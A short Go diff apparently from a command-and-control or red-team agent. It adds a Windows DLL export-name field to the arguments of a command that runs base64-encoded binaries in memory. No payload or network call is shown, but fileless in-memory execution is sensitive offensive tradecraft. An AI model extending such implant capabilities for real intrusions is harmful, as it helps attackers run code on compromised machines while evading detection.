@@ -27,9 +27,10 @@ func (c *ExecuteMemoryCommand) Description() string {
 }
 
 type executeMemoryArgs struct {
-	BinaryB64 string `json:"binary_b64"` // base64-encoded ELF binary
-	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
-	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
+	BinaryB64  string `json:"binary_b64"`  // base64-encoded ELF binary
+	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
+	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
+	ExportName string `json:"export_name"` // (Windows only) export function to call for DLLs
 }
 
 func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
